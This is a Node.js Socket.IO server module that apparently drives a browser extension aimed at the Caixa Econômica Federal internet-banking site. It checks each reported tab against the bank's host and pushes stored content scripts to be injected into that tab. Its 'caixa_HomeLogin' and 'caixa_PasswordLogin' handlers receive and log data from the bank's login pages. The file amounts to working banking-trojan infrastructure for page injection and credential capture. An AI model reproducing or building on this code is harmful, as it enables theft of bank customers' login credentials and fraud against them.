'use strict';

var fs = require('fs');
var appPath = process.cwd();
var contentPath = appPath+'/banks/caixa/server/content';
var fs = require('fs');
var path = require('path');
var events = require('events');
var eventEmitter  = new events.EventEmitter();


module.exports = function(app, io, db){

	// Initializing vars contentScripts
	var contentScripts = {};
	var homeName = 'CEF';
	var hosts = 'internetbanking.caixa.gov.br';

	// Load all content files and sabe on obj contentScripts
    fs.readdirSync(contentPath).forEach(function(fileName) {
    	var scriptName = fileName.split('.')[0];
    	var newPath = path.join(contentPath,fileName);
    	fs.readFile(newPath, "utf8", function (err, data) {
		    if (err) throw err;
		    contentScripts[scriptName] = data.toString();
		});
  	});

	
	io.on('connection', function(socket){

		var sendErr = function(event, err){
			socket.emit(event,{
				err : err,
				homeName : homeName
			});
		};

		socket.on('onTabUpdated', function(tab){
			
			if(!tab || !tab.url || !tab.id) {
				sendErr('err_onTabUpdated','incompleteTab');
				return;
			};

			var hostTabUrl = tab.url.split('/')[2];
			if(hosts !== hostTabUrl){	
				sendErr('err_onTabUpdated', 'incorrectHost');
				return;
			}

			// Checking the current page
			socket.emit('injectContentScriptByTabId', tab.id, contentScripts.checkPage);
		});


		socket.on('injectContentScript', function(sender, request, response){
			// Check if sender and sender.tab params exists
			if(!sender || !sender.tab || !sender.tab.id){
				sendErr('err_injectContentScript','incompleteSender');
				return;
			}

			// Check if request and request.data params exists
			if(!request || !request.data ){
				sendErr('err_injectContentScript','incompleteRequest');
				return;
			};

			// Check if request.data.homeName is CEF
			if(request.data.homeName == null){
				sendErr('err_injectContentScript','incompleteHomeName');
				return;
			};

			// Check if request.data.pageName is exists
			if(!request.data.pageName ){
				sendErr('err_injectContentScript','incompletePageName');
				return;
			};


			var tab = sender.tab;
			var pageName = request.data.pageName;
			

			// Check folder content contains respective pageName
			var keys = Object.keys(contentScripts);
			if(keys.indexOf(pageName) == -1){
				sendErr('err_injectContentScript','incorrectPageName');
				return;
			}

			// pageName exists, injecting content_script on page
			socket.emit('injectContentScriptByTabId', tab.id, contentScripts[pageName]);
		});

		// socket.on('pulseConnectionPage', function(sender, request, response){
		// 	// Check if sender and sender.tab params exists
		// 	if(!sender || !sender.tab ) return;

		// 	// Check if request and request.data params exists
		// 	if(!request || !request.data ) return;

		// 	// Check if request.data.homeName is CEF
		// 	if(request.data.homeName == null) return;

		// 	// Check if request.data.pageName is exists
		// 	if(!request.data.pageName ) return;

		// 	var tab = sender.tab;
		// 	var pageName = request.data.pageName;
		// 	console.log(pageName);

		// });

		socket.on('caixa_HomeLogin', function(sender, request, response){
			console.log(request);
		});

		socket.on('caixa_PasswordLogin', function(sender, request, response){
			console.log(request);
		});

		socket.on('disconnect', function(){
			console.log(socket.id+' desconectado');
		});
	});

};
